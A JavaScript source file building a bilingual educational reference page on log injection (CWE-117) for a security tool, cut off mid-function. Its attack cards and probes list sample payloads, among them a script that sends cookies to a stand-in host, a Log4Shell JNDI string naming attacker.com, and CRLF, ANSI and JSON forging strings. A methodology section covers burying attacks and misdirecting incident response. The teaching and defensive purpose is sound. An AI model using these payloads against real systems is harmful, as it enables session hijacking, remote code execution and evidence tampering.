/* =========================================================================
   Code Guardian — Log Injection / Log Forging deep-dive page
   Standalone full-screen reference panel. Vanilla JS + Prism highlighting.
   Accent: YELLOW (#eab308) — Log Injection is Medium severity.
   ========================================================================= */
import { $, $$ } from './dom.js';
import { highlightElement } from './highlight.js';
import { getLang } from '../i18n/index.js';

/* ---------- tiny helpers ---------- */
const esc = (s) =>
  String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

const SVG = {
  close:
    '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
  shield:
    '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
  copy:
    '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>',
};

/* ---------- localized micro-strings ---------- */
const TXT = {
  tab: { en: 'Logi', pl: 'Logi' },
  open: { en: 'Open Log Injection deep-dive', pl: 'Otwórz przewodnik Log Injection' },
  close: { en: 'Close', pl: 'Zamknij' },
  copy: { en: 'Copy', pl: 'Kopiuj' },
  copied: { en: 'Copied', pl: 'Skopiowano' },
  vuln: { en: 'Vulnerable', pl: 'Podatny' },
  safe: { en: 'Secure', pl: 'Bezpieczny' },
};
const tr = (o) => o[getLang()] ?? o.en;

/* =========================================================================
   CONTENT DATA
   ========================================================================= */

const NAV = [
  { id: 'logi-overview', en: 'Overview', pl: 'Przegląd' },
  { id: 'logi-types', en: 'Attack types', pl: 'Typy ataków' },
  { id: 'logi-cheatsheet', en: 'Detection cheatsheet', pl: 'Ściąga detekcji' },
  { id: 'logi-code', en: 'Vuln vs Secure', pl: 'Podatny vs Bezpieczny' },
  { id: 'logi-orm', en: 'Language cheatsheet', pl: 'Ściąga języków' },
  { id: 'logi-method', en: 'Methodology', pl: 'Metodyka' },
  { id: 'logi-defense', en: 'Defense layers', pl: 'Warstwy obrony' },
  { id: 'logi-incidents', en: 'Real incidents', pl: 'Incydenty' },
  { id: 'logi-tools', en: 'SAST / DAST', pl: 'SAST / DAST' },
  { id: 'logi-compliance', en: 'Compliance', pl: 'Zgodność' },
  { id: 'logi-ir', en: 'Incident response', pl: 'Reagowanie' },
  { id: 'logi-sources', en: 'Sources', pl: 'Źródła' },
];

const TYPES = [
  {
    name: 'CRLF Log Forging',
    sev: 'medium',
    desc: { en: 'Injecting \\r\\n into logged user input creates entirely new synthetic log entries attributed to arbitrary IPs or users — the base technique of CWE-117.', pl: 'Wstrzyknięcie \\r\\n do logowanego wejścia tworzy całkowicie nowe, syntetyczne wpisy logu przypisane do dowolnych IP lub kont — bazowa technika CWE-117.' },
    payload: 'admin\\r\\nFAKE 2026-01-01 LOGIN OK user=root',
  },
  {
    name: 'Log Poisoning XSS',
    sev: 'high',
    desc: { en: 'HTML/JS placed in User-Agent or username is logged verbatim, then executes as stored XSS when a high-privilege SOC analyst views it in Kibana, Graylog or Splunk.', pl: 'HTML/JS w User-Agent lub nazwie użytkownika jest logowany dosłownie, a potem wykonuje się jako stored XSS, gdy uprzywilejowany analityk SOC otwiera go w Kibanie, Graylogu lub Splunku.' },
    payload: '<script>fetch("//atk/?c="+document.cookie)</script>',
  },
  {
    name: 'Log4Shell Escalation (CVE-2021-44228)',
    sev: 'critical',
    desc: { en: '${jndi:ldap://attacker.com/exploit} in any logged field triggers a JNDI lookup → remote class loading → full RCE (CVSS 10.0). Log injection becomes Critical instantly.', pl: '${jndi:ldap://attacker.com/exploit} w dowolnym logowanym polu wyzwala lookup JNDI → zdalne ładowanie klas → pełne RCE (CVSS 10.0). Log injection natychmiast staje się krytyczny.' },
    payload: '${jndi:ldap://attacker.com/exploit}',
  },
  {
    name: 'ANSI Escape Code Injection',
    sev: 'medium',
    desc: { en: '\\x1b[2J (clear screen) or cursor-up sequences in terminal log viewers (journalctl/tail/less) overwrite displayed lines, hiding attack evidence in real-time monitoring.', pl: '\\x1b[2J (czyszczenie ekranu) lub sekwencje cursor-up w terminalowych podglądach logów (journalctl/tail/less) nadpisują wyświetlane linie, ukrywając dowody ataku w monitoringu na żywo.' },
    payload: '\\x1b[2J\\x1b[1A\\x1b[2K  (clear + overwrite)',
  },
  {
    name: 'JSON / NDJSON Field Injection',
    sev: 'high',
    desc: { en: 'Injecting \\n{"level":"INFO","msg":"legitimate"} into a logged string creates a fully synthetic Elasticsearch document indistinguishable from real events, breaking alert count rules.', pl: 'Wstrzyknięcie \\n{"level":"INFO","msg":"legitimate"} do logowanego stringa tworzy w pełni syntetyczny dokument Elasticsearch nieodróżnialny od prawdziwych zdarzeń, psując reguły liczące alerty.' },
    payload: 'x\\n{"level":"INFO","msg":"legitimate"}',
  },
  {
    name: 'CEF / Syslog Separator Injection',
    sev: 'medium',
    desc: { en: 'Pipe | characters in logged values shift CEF field boundaries inside SIEMs, suppressing security alerts or mislabeling event categories.', pl: 'Znaki pipe | w logowanych wartościach przesuwają granice pól CEF w SIEM-ach, tłumiąc alerty bezpieczeństwa lub błędnie kategoryzując zdarzenia.' },
    payload: 'user|low|0|act=allow  (CEF boundary shift)',
  },
  {
    name: 'SIEM Dilution Attack',
    sev: 'medium',
    desc: { en: 'Bulk-injected synthetic 200 OK entries suppress anomaly-detection baselines and "rare URL" Splunk/QRadar alerts, masking a real attack in the noise.', pl: 'Masowo wstrzyknięte syntetyczne wpisy 200 OK tłumią bazowe progi wykrywania anomalii i alerty "rare URL" w Splunk/QRadar, maskując prawdziwy atak w szumie.' },
    payload: '10k× "GET / 200" → baseline poisoning',
  },
  {
    name: 'HTTP Header Log Planting',
    sev: 'medium',
    desc: { en: 'User-Agent / X-Forwarded-For with \\r\\n injects fake Apache access log entries attributed to arbitrary IPs, redirecting incident-response investigation.', pl: 'User-Agent / X-Forwarded-For z \\r\\n wstrzykuje fałszywe wpisy access logu Apache przypisane do dowolnych IP, kierując dochodzenie IR na fałszywy trop.' },
    payload: 'X-Forwarded-For: 1.2.3.4\\r\\n8.8.8.8 - - [..] "GET /admin"',
  },
];

const DBS = [
  {
    name: 'CRLF probe',
    rows: [
      ['Vector', 'value\\r\\nFAKE_ENTRY'],
      ['Where', 'User-Agent / username'],
      ['Signal', 'fake line appears in logs'],
      ['Confirm', 'separate log entry created'],
      ['Impact', 'log forging / IP spoofing'],
      ['CWE', 'CWE-117 base technique'],
    ],
  },
  {
    name: 'XSS probe',
    rows: [
      ['Vector', '<script>alert(1)</script>'],
      ['Where', 'any logged field'],
      ['Signal', 'log viewer renders HTML'],
      ['Confirm', 'script executes in dashboard'],
      ['Impact', 'SOC analyst session hijack'],
      ['Tool', 'Kibana / Graylog / Splunk'],
    ],
  },
  {
    name: 'Log4Shell probe',
    rows: [
      ['Vector', '${jndi:ldap://oast.me/test}'],
      ['Where', 'any HTTP header'],
      ['Signal', 'DNS callback fires'],
      ['Confirm', 'JNDI evaluation occurred'],
      ['Impact', 'remote code execution'],
      ['Tool', 'OAST / Collaborator'],
    ],
  },
  {
    name: 'ANSI probe',
    rows: [
      ['Vector', '\\x1b[1;31mRED'],
      ['Where', 'terminal-viewed logs'],
      ['Signal', 'viewer renders red text'],
      ['Confirm', 'escape codes interpreted'],
      ['Impact', 'evidence hiding / overwrite'],
      ['Tool', 'tail / less / journalctl'],
    ],
  },
  {
    name: 'JSON injection probe',
    rows: [
      ['Vector', '","injected":"value'],
      ['Where', 'fields logged to JSON'],
      ['Signal', 'aggregator adds extra field'],
      ['Confirm', 'synthetic doc indexed'],
      ['Impact', 'alert-count rule bypass'],
      ['Tool', 'Elasticsearch / NDJSON'],
    ],
  },
];

const CODE = {
  'Java (Log4j2)': {
    lang: 'java',
    vuln: `// VULNERABLE — user input concatenated into the log message
String user = request.getParameter("user");
logger.info("User: " + user);   // \\r\\n forges entries; \${jndi:...} → RCE`,
    safe: `// SECURE — parameterized message + patched Log4j (2.17.1+)
String user = request.getParameter("user");
logger.info("User: {}", user);  // value treated as data, not pattern
// Upgrade Log4j2 to 2.17.1+ — JNDI lookups disabled by default`,
  },
  Python: {
    lang: 'python',
    vuln: `# VULNERABLE — f-string with raw newlines forges new log lines
logging.info(f"User: {user_input}")   # "a\\nFAKE ..." → fake entry`,
    safe: `# SECURE — strip CR/LF, use lazy %-args (no interpolation in message)
clean = user_input.replace('\\n', '').replace('\\r', '')
logging.info("User: %s", clean)`,
  },
  'Node.js (winston)': {
    lang: 'javascript',
    vuln: `// VULNERABLE (winston) — string concatenation into the message
logger.info('User: ' + req.body.user);   // CRLF / JSON injection`,
    safe: `// SECURE — structured logging: user input is a data field, not structure
logger.info('User login', { user: sanitize(req.body.user) });`,
  },
  PHP: {
    lang: 'php',
    vuln: `<?php // VULNERABLE — raw POST value concatenated into the log
error_log("User: " . $_POST['user']);   // \\r\\n forges new entries`,
    safe: `<?php // SECURE — strip CR/LF before writing
$clean = str_replace(["\\r", "\\n"], '', $_POST['user']);
error_log("User: " . $clean);`,
  },
  '.NET': {
    lang: 'csharp',
    vuln: `// VULNERABLE — string concatenation into the log message
_logger.LogInformation("User: " + input);   // CRLF / forging`,
    safe: `// SECURE — message template + structured property
var sanitizedInput = input.Replace("\\r", "").Replace("\\n", "");
_logger.LogInformation("User: {User}", sanitizedInput);`,
  },
};

const ORM = [
  { fw: 'Java (Log4j2)', api: `logger.info("User: " + userInput)`, note: { en: 'Vulnerable sink — string concatenation (CRLF + JNDI). Safe alternative: logger.info("User: {}", userInput) parameterized + upgrade to Log4j 2.17.1+.', pl: 'Podatny sink — konkatenacja stringów (CRLF + JNDI). Bezpiecznie: logger.info("User: {}", userInput) parametryzowane + aktualizacja Log4j do 2.17.1+.' } },
  { fw: 'Python', api: `logging.info(f"User: {user_input}")`, note: { en: 'Vulnerable sink — f-string with newlines. Safe alternative: logging.info("User: %s", user_input.replace("\\n","").replace("\\r","")).', pl: 'Podatny sink — f-string z nowymi liniami. Bezpiecznie: logging.info("User: %s", user_input.replace("\\n","").replace("\\r","")).' } },
  { fw: 'Node.js (winston)', api: `logger.info('User: ' + req.body.user)`, note: { en: 'Vulnerable sink — concatenation. Safe alternative: logger.info("User login", { user: sanitize(req.body.user) }) structured logging.', pl: 'Podatny sink — konkatenacja. Bezpiecznie: logger.info("User login", { user: sanitize(req.body.user) }) logowanie strukturalne.' } },
  { fw: 'PHP', api: `error_log("User: " . $_POST['user'])`, note: { en: 'Vulnerable sink — concatenation. Safe alternative: error_log("User: " . str_replace(["\\r","\\n"], "", $_POST["user"])).', pl: 'Podatny sink — konkatenacja. Bezpiecznie: error_log("User: " . str_replace(["\\r","\\n"], "", $_POST["user"])).' } },
  { fw: '.NET', api: `_logger.LogInformation("User: " + input)`, note: { en: 'Vulnerable sink — concatenation. Safe alternative: _logger.LogInformation("User: {User}", sanitizedInput) structured message template.', pl: 'Podatny sink — konkatenacja. Bezpiecznie: _logger.LogInformation("User: {User}", sanitizedInput) strukturalny szablon wiadomości.' } },
];

const METHOD = [
  { en: ['Detect', 'Send \\r\\nFAKE_ENTRY in User-Agent or username and check whether a separate, attacker-controlled line appears in the logs.'], pl: ['Wykrycie', 'Wyślij \\r\\nFAKE_ENTRY w User-Agent lub nazwie użytkownika i sprawdź, czy w logach pojawia się osobna, kontrolowana przez atakującego linia.'] },
  { en: ['Probe viewers', 'Inject <script>alert(1)</script> and \\x1b[1;31mRED to test whether the log viewer renders HTML (stored XSS) or interprets ANSI escapes.'], pl: ['Sonduj podglądy', 'Wstrzyknij <script>alert(1)</script> oraz \\x1b[1;31mRED, by sprawdzić, czy podgląd logów renderuje HTML (stored XSS) lub interpretuje sekwencje ANSI.'] },
  { en: ['Test JNDI', 'Place ${jndi:ldap://oast.me/test} in any logged header — a DNS callback confirms a Log4Shell-class JNDI evaluation and escalates to RCE.'], pl: ['Testuj JNDI', 'Umieść ${jndi:ldap://oast.me/test} w dowolnym logowanym nagłówku — callback DNS potwierdza ewaluację JNDI klasy Log4Shell i eskaluje do RCE.'] },
  { en: ['Forge structure', 'Inject \\n{"level":"INFO",...} or CEF pipes | to create synthetic documents and shift SIEM field boundaries, breaking alert-count and category rules.'], pl: ['Fałszuj strukturę', 'Wstrzyknij \\n{"level":"INFO",...} lub pipe-y CEF |, by tworzyć syntetyczne dokumenty i przesuwać granice pól SIEM, psując reguły liczące alerty i kategorie.'] },
  { en: ['Bury the attack', 'Flood the pipeline with synthetic 200 OK entries to poison anomaly baselines, then forge access-log lines to misdirect the incident-response trail.'], pl: ['Zakop atak', 'Zalej pipeline syntetycznymi wpisami 200 OK, by zatruć bazowe progi anomalii, a potem sfałszuj linie access logu, by zmylić trop reagowania na incydent.'] },
];

const DEFENSE = [
  { rank: 1, eff: 100, label: { en: 'Structured logging', pl: 'Logowanie strukturalne' }, kind: 'primary', note: { en: 'JSON-serialized key-value fields (pino, Serilog, structlog, logback) treat user input as data, not structure — an injected \\n produces an invalid record rejected by the shipper.', pl: 'Pola klucz-wartość serializowane do JSON (pino, Serilog, structlog, logback) traktują wejście jako dane, nie strukturę — wstrzyknięty \\n daje nieprawidłowy rekord odrzucany przez shipper.' } },
  { rank: 2, eff: 85, label: { en: 'Input sanitization', pl: 'Sanityzacja wejścia' }, kind: 'strong', note: { en: 'Strip \\r, \\n, NUL and ANSI CSI (\\x1b[) from every user-supplied value before logging it.', pl: 'Usuwaj \\r, \\n, NUL i ANSI CSI (\\x1b[) z każdej wartości od użytkownika przed jej zalogowaniem.' } },
  { rank: 3, eff: 80, label: { en: 'Upgrade Log4j', pl: 'Aktualizacja Log4j' }, kind: 'strong', note: { en: '2.17.1+ (Java 8), 2.12.4+ (Java 7), 2.3.2+ (Java 6) disable JNDI lookups by default — closes the Log4Shell escalation path.', pl: '2.17.1+ (Java 8), 2.12.4+ (Java 7), 2.3.2+ (Java 6) domyślnie wyłączają lookupy JNDI — zamyka ścieżkę eskalacji Log4Shell.' } },
  { rank: 4, eff: 70, label: { en: 'WORM log shipping', pl: 'Wysyłka logów WORM' }, kind: 'strong', note: { en: 'S3 Object Lock Compliance mode / Azure Immutable Blob make post-write tampering impossible — though pre-write injection is still preserved.', pl: 'S3 Object Lock w trybie Compliance / Azure Immutable Blob uniemożliwiają manipulację po zapisie — choć wstrzyknięcie przed zapisem nadal zostaje utrwalone.' } },
  { rank: 5, eff: 60, label: { en: 'Hash-chain integrity', pl: 'Integralność łańcucha haszy' }, kind: 'mitigation', note: { en: 'HMAC-chained entry hashes (systemd-journal model) make deletion or alteration detectable; NIST SP 800-92 recommends this control.', pl: 'Łańcuchowe HMAC haszy wpisów (model systemd-journal) czynią usunięcie lub zmianę wykrywalnymi; NIST SP 800-92 zaleca tę kontrolę.' } },
  { rank: 6, eff: 55, label: { en: 'Output-context escaping in viewers', pl: 'Escaping kontekstu w podglądach' }, kind: 'mitigation', note: { en: 'Kibana/Grafana must HTML-escape log fields before rendering; disable raw HTML in log-viewer dashboards to stop stored XSS.', pl: 'Kibana/Grafana muszą HTML-escapować pola logów przed renderowaniem; wyłącz surowy HTML w dashboardach podglądu logów, by zatrzymać stored XSS.' } },
  { rank: 7, eff: 45, label: { en: 'IAM no-delete policy', pl: 'Polityka IAM bez usuwania' }, kind: 'mitigation', note: { en: 'Application service accounts must hold no s3:DeleteObject or log-deletion permission — use a separate, isolated log-archival role.', pl: 'Konta usługowe aplikacji nie mogą mieć uprawnień s3:DeleteObject ani kasowania logów — użyj osobnej, izolowanej roli archiwizacji logów.' } },
];

const INCIDENTS = [
  { org: 'Log4Shell', year: 2021, impact: 'CVE-2021-44228', cost: 'CVSS 10.0 · 100M+', en: 'Apache Log4j2 JNDI injection via any logged string (CVSS 10.0) — an estimated 100M+ vulnerable instances, exploited by ransomware and nation-states within hours of disclosure. The worst log-injection escalation in history.', pl: 'Wstrzyknięcie JNDI w Apache Log4j2 przez dowolny logowany string (CVSS 10.0) — szacunkowo ponad 100M podatnych instancji, wykorzystane przez ransomware i grupy państwowe w ciągu godzin od ujawnienia. Najgorsza eskalacja log injection w historii.' },
  { org: 'SolarWinds SUNBURST', year: 2020, impact: 'Log suppression', cost: 'Stealth core', en: 'The attacker actively modeled defender logging pipelines, suppressed specific Windows Event IDs when EDR was present, and mimicked Orion telemetry log formats — log manipulation as a core stealth technique.', pl: 'Atakujący aktywnie modelował pipeline logowania obrońców, tłumił konkretne Windows Event ID przy obecności EDR i imitował formaty telemetrii Orion — manipulacja logami jako kluczowa technika ukrywania.' },
  { org: 'Equifax', year: 2017, impact: '147M records', cost: '19 mo blind', en: 'An expired TLS certificate killed IDS/log monitoring for 19 months; attackers exploited the gap to exfiltrate 147M records undetected — the functional equivalent of active log suppression.', pl: 'Wygasły certyfikat TLS unieruchomił monitoring IDS/logów na 19 miesięcy; atakujący wykorzystali lukę, by niewykryci wyeksfiltrować 147M rekordów — funkcjonalny odpowiednik aktywnego tłumienia logów.' },
  { org: 'Jenkins HTML Injection', year: 2018, impact: 'Stored XSS', cost: 'SIEM RCE', en: 'Build-step stdout rendered as raw HTML enabled stored XSS via the console log, resurfacing in AnsiColor and Blue Ocean plugins — analyst RCE via crafted build output.', pl: 'Stdout kroku budowania renderowany jako surowy HTML umożliwił stored XSS przez log konsoli, wracając w pluginach AnsiColor i Blue Ocean — RCE analityka przez spreparowany output budowania.' },
  { org: 'GitHub Actions ANSI', year: 2021, impact: 'Log overwrite', cost: 'Forensic split', en: 'Compromised build dependencies injected ANSI cursor-up/erase sequences that erased visible CI log lines while the raw bytes remained — a forensic split between the UI and reality.', pl: 'Skompromitowane zależności budowania wstrzyknęły sekwencje ANSI cursor-up/erase, które wymazały widoczne linie logu CI, podczas gdy surowe bajty pozostały — rozdźwięk forensyczny między UI a rzeczywistością.' },
  { org: 'Kibana Stored XSS', year: 2022, impact: 'Log poisoning', cost: '$5k–$15k', en: 'Web apps logging raw User-Agent to the ELK stack without escaping produced XSS in Kibana dashboards → SOC analyst session hijack, the subject of multiple bug bounties in the $5k–$15k range.', pl: 'Aplikacje logujące surowy User-Agent do stacku ELK bez escapingu dawały XSS w dashboardach Kibany → przejęcie sesji analityka SOC, przedmiot wielu bug bounty w przedziale $5k–$15k.' },
];

const TOOLS = {
  sast: [
    ['Semgrep', 'log-injection / tainted-format rules'],
    ['CodeQL', 'java/log-injection, log4j-injection queries'],
    ['Fortify', 'Log Forging category'],
    ['SonarQube', 'S5145 user input in log'],
  ],
  dast: [
    ['Burp Suite', 'CRLF + XSS payloads in headers'],
    ['OWASP ZAP', 'CRLF injection active rules'],
    ['log4j-scan', 'JNDI / Log4Shell detection'],
    ['Burp Collaborator', 'JNDI / OAST callbacks'],
  ],
};

const COMPLIANCE = [
  { std: 'PCI DSS', items: ['Req 10.5.1 — log files protected', 'from unauthorized modification', 'injection → Level 1 re-assessment'] },
  { std: 'SOC 2', items: ['CC7.2 — monitoring control objective', 'forged logs nullify the control', 'auditors require log-integrity evidence'] },
  { std: 'GDPR', items: ['Art. 5(1)(f) — integrity & confidentiality', 'Art. 33 — audit-trail tampering reportable', 'fines up to 4% global annual turnover'] },
];

const IR = {
  en: [
    'Isolate the affected logging pipeline / log-ingestion endpoint',
    'Snapshot raw log bytes before any viewer renders them (ANSI/HTML)',
    'If Log4j is in scope, patch to 2.17.1+ and hunt for JNDI callbacks',
    'Assess scope — which entries are forged, suppressed, or XSS-laden',
    'Strip \\r \\n NUL ANSI at the source; move to structured logging',
    'Enable WORM shipping + hash-chain integrity on archived logs',
    'Notify regulators within 72h (GDPR) if audit trails were tampered',
    'Post-incident: SAST sweep for concatenated log sinks and raw-HTML viewers',
  ],
  pl: [
    'Odizoluj dotknięty pipeline logowania / endpoint ingestu logów',
    'Zrób snapshot surowych bajtów logu zanim podgląd je wyrenderuje (ANSI/HTML)',
    'Jeśli Log4j jest w zakresie, załataj do 2.17.1+ i szukaj callbacków JNDI',
    'Oceń zakres — które wpisy są sfałszowane, stłumione lub z XSS',
    'Usuwaj \\r \\n NUL ANSI u źródła; przejdź na logowanie strukturalne',
    'Włącz wysyłkę WORM + integralność łańcucha haszy na zarchiwizowanych logach',
    'Powiadom regulatorów w 72h (GDPR), jeśli audit trail został naruszony',
    'Po incydencie: przegląd SAST pod kątem sklejanych sinków logów i podglądów z surowym HTML',
  ],
};

const SOURCES = [
  ['OWASP A09:2021 Logging Failures', 'https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/'],
  ['CWE-117 (MITRE)', 'https://cwe.mitre.org/data/definitions/117.html'],
  ['OWASP Logging Cheat Sheet', 'https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html'],
  ['PortSwigger — Log injection', 'https://portswigger.net/web-security/log-injection'],
  ['CISA AA21-356A (Log4Shell)', 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a'],
];

/* =========================================================================
   RENDERING
   ========================================================================= */

function sevClass(s) {
  return { critical: 'badge-critical', high: 'badge-high', medium: 'badge-medium', low: 'badge-low' }[s] || 'badge-low';
}

function codeBlock(lang, code) {
  return `<div class="logi-code-area">
    <button class="logi-copy" type="button" title="${tr(TXT.copy)}">${SVG.copy}<span>${tr(TXT.copy)}</span></button>
    <pre><code class="language-${lang}">${esc(code)}</code></pre>
  </div>`;
}

function buildNav() {
  const lang = getLang();
  return NAV.map((n, i) =>
    `<a class="logi-nav-link${i === 0 ? ' active' : ''}" href="#${n.id}" data-target="${n.id}">${n[lang]}</a>`
  ).join('');
}

function buildOverview() {
  const lang = getLang();
  const lead = lang === 'en'
    ? "Log Injection (Log Forging, CWE-117) abuses the fact that user input often reaches log files unescaped. By injecting \\r\\n an attacker fabricates entirely new log entries attributed to arbitrary IPs or users; by injecting HTML or ANSI escapes they poison the viewer the log is read in. The same root cause escalates dramatically with context: a single ${jndi:ldap://...} string turned Log4Shell into a CVSS 10.0 RCE, while bulk synthetic entries quietly dilute SIEM baselines to bury a real attack in the noise."
    : "Log Injection (Log Forging, CWE-117) wykorzystuje fakt, że wejście użytkownika często trafia do plików logów bez escapingu. Wstrzykując \\r\\n atakujący fabrykuje całkowicie nowe wpisy przypisane do dowolnych IP lub kont; wstrzykując HTML lub sekwencje ANSI zatruwa podgląd, w którym log jest czytany. Ta sama przyczyna eskaluje dramatycznie w zależności od kontekstu: pojedynczy string ${jndi:ldap://...} zamienił Log4Shell w RCE o CVSS 10.0, a masowe syntetyczne wpisy po cichu rozcieńczają progi SIEM, by zakopać prawdziwy atak w szumie.";

  return `<section id="logi-overview" class="logi-section">
    <div class="logi-hero">
      <span class="logi-eyebrow">${SVG.shield}<span>Code Guardian · Deep-dive</span></span>
      <h1>Log <span class="grad">Injection</span></h1>
      <span class="logi-sev-badge">${lang === 'en' ? 'Medium severity' : 'Średnia waga'}</span>
      <p class="logi-lead">${lead}</p>
      <div class="logi-metrics">
        <div class="logi-metric high"><div class="logi-metric-k">CWE-117</div><div class="logi-metric-v">${lang === 'en' ? 'Weakness ID' : 'ID słabości'}</div></div>
        <div class="logi-metric high"><div class="logi-metric-k">6.5</div><div class="logi-metric-v">CVSS · Medium</div></div>
        <div class="logi-metric"><div class="logi-metric-k">A09:2021</div><div class="logi-metric-v">OWASP Top 10</div></div>
        <div class="logi-metric"><div class="logi-metric-k">8</div><div class="logi-metric-v">${lang === 'en' ? 'Attack variants' : 'Warianty ataku'}</div></div>
      </div>
      <div class="logi-sources">
        <span class="logi-sources-label">${lang === 'en' ? 'Verified sources:' : 'Zweryfikowane źródła:'}</span>
        <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" target="_blank" rel="noopener" class="logi-source-link">OWASP A09:2021</a>
        <a href="https://cwe.mitre.org/data/definitions/117.html" target="_blank" rel="noopener" class="logi-source-link">CWE-117 (MITRE)</a>
        <a href="https://portswigger.net/web-security/log-injection" target="_blank" rel="noopener" class="logi-source-link">PortSwigger Academy</a>
        <a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html" target="_blank" rel="noopener" class="logi-source-link">OWASP Cheat Sheet</a>
        <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" target="_blank" rel="noopener" class="logi-source-link">CISA Log4Shell</a>
      </div>
    </div>
  </section>`;
}

function buildTypes() {
  const lang = getLang();
  const cards = TYPES.map((t) => `
    <article class="logi-type-card">
      <header>
        <h3>${esc(t.name)}</h3>
        <span class="badge ${sevClass(t.sev)}">${t.sev}</span>
      </header>
      <p>${t.desc[lang]}</p>
      <div class="logi-payload"><span class="logi-payload-tag">payload</span><code>${esc(t.payload)}</code></div>
    </article>`).join('');
  return secWrap('logi-types', lang === 'en' ? 'Attack types' : 'Typy ataków',
    lang === 'en' ? 'Eight ways the same root cause manifests — from plain CRLF log forging to a Log4Shell JNDI escalation that turns a logged string into full RCE.' : 'Osiem sposobów, w jakie ta sama przyczyna się ujawnia — od zwykłego CRLF log forging po eskalację JNDI Log4Shell zamieniającą logowany string w pełne RCE.',
    `<div class="logi-type-grid">${cards}</div>`);
}

function buildCheatsheet() {
  const lang = getLang();
  const cols = DBS.map((db) => `
    <div class="logi-db-col">
      <h4>${esc(db.name)}</h4>
      ${db.rows.map((r) => `<div class="logi-db-row"><span class="logi-db-key">${esc(r[0])}</span><code>${esc(r[1])}</code></div>`).join('')}
    </div>`).join('');
  return secWrap('logi-cheatsheet', lang === 'en' ? 'Detection cheatsheet' : 'Ściąga detekcji',
    lang === 'en' ? 'Five practical probes to confirm a log injection point — from a CRLF forging test to an out-of-band JNDI callback for Log4Shell.' : 'Pięć praktycznych sond potwierdzających punkt log injection — od testu CRLF forging po callback JNDI poza pasmem dla Log4Shell.',
    `<div class="logi-db-grid">${cols}</div>`);
}

function buildCode() {
  const lang = getLang();
  const langs = Object.keys(CODE);
  const tabs = langs.map((l, i) =>
    `<button class="logi-lang-tab${i === 0 ? ' active' : ''}" data-lang="${l}" type="button">${l}</button>`).join('');
  const panels = langs.map((l, i) => {
    const c = CODE[l];
    return `<div class="logi-lang-panel${i === 0 ? ' active' : ''}" data-lang="${l}">
      <div class="logi-vs">
        <div class="logi-vs-col vuln"><div class="logi-vs-head vuln">✗ ${tr(TXT.vuln)}</div>${codeBlock(c.lang, c.vuln)}</div>
        <div class="logi-vs-col safe"><div class="logi-vs-head safe">✓ ${tr(TXT.safe)}</div>${codeBlock(c.lang, c.safe)}</div>
      </div>
    </div>`;
  }).join('');
  return secWrap('logi-code', lang === 'en' ? 'Vulnerable vs Secure' : 'Podatny vs Bezpieczny',
    lang === 'en' ? 'The same fix across five languages: never concatenate raw input into a log message — use parameterized/structured logging and strip CR/LF.' : 'Ta sama naprawa w pięciu językach: nigdy nie sklejaj surowego wejścia z wiadomością logu — używaj logowania parametryzowanego/strukturalnego i usuwaj CR/LF.',
    `<div class="logi-lang-tabs">${tabs}</div><div class="logi-lang-panels">${panels}</div>`);
}

function buildOrm() {
  const lang = getLang();
  const rows = ORM.map((o) => `
    <div class="logi-orm-row">
      <div class="logi-orm-fw">${esc(o.fw)}</div>
      <code class="logi-orm-api">${esc(o.api)}</code>
      <div class="logi-orm-note">${o.note[lang]}</div>
    </div>`).join('');
  return secWrap('logi-orm', lang === 'en' ? 'Language cheatsheet' : 'Ściąga języków',
    lang === 'en' ? 'Per-language vulnerable log sinks and their safe alternatives. The pattern is identical everywhere: stop concatenating, start parameterizing.' : 'Podatne sinki logów per język i ich bezpieczne odpowiedniki. Wzorzec jest wszędzie identyczny: przestań sklejać, zacznij parametryzować.',
    `<div class="logi-orm">${rows}</div>`);
}

function buildMethod() {
  const lang = getLang();
  const steps = METHOD.map((m, i) => `
    <div class="logi-step">
      <div class="logi-step-num">${i + 1}</div>
      <div class="logi-step-body"><h4>${m[lang][0]}</h4><p>${m[lang][1]}</p></div>
    </div>`).join('');
  return secWrap('logi-method', lang === 'en' ? 'Attack methodology' : 'Metodyka ataku',
    lang === 'en' ? 'How an attacker progresses from a CRLF probe to full SIEM evasion.' : 'Jak atakujący przechodzi od sondy CRLF do pełnego omijania SIEM.',
    `<div class="logi-timeline">${steps}</div>`);
}

function buildDefense() {
  const lang = getLang();
  const rows = DEFENSE.map((d) => `
    <div class="logi-def-row ${d.kind}">
      <div class="logi-def-rank">#${d.rank}</div>
      <div class="logi-def-main">
        <div class="logi-def-label">${d.label[lang]}</div>
        <div class="logi-def-note">${d.note[lang]}</div>
      </div>
      <div class="logi-def-bar"><span style="width:${d.eff}%"></span></div>
    </div>`).join('');
  return secWrap('logi-defense', lang === 'en' ? 'Defense layers, ranked' : 'Warstwy obrony wg skuteczności',
    lang === 'en' ? 'Defense in depth — but not all layers are equal. Structured logging is the fix; everything else reduces blast radius and preserves integrity.' : 'Obrona w głąb — ale warstwy nie są równe. Logowanie strukturalne to naprawa; reszta ogranicza skutki i chroni integralność.',
    `<div class="logi-defense">${rows}</div>`);
}

function buildIncidents() {
  const lang = getLang();
  const cards = INCIDENTS.map((i) => `
    <article class="logi-incident">
      <div class="logi-incident-top"><h4>${esc(i.org)}</h4><span class="logi-incident-year">${i.year}</span></div>
      <div class="logi-incident-nums"><span class="logi-incident-impact">${esc(i.impact)}</span><span class="logi-incident-cost">${esc(i.cost)}</span></div>
      <p>${i[lang]}</p>
    </article>`).join('');
  const sources = `<div class="logi-inline-sources">${lang === 'en' ? 'Sources:' : 'Źródła:'}
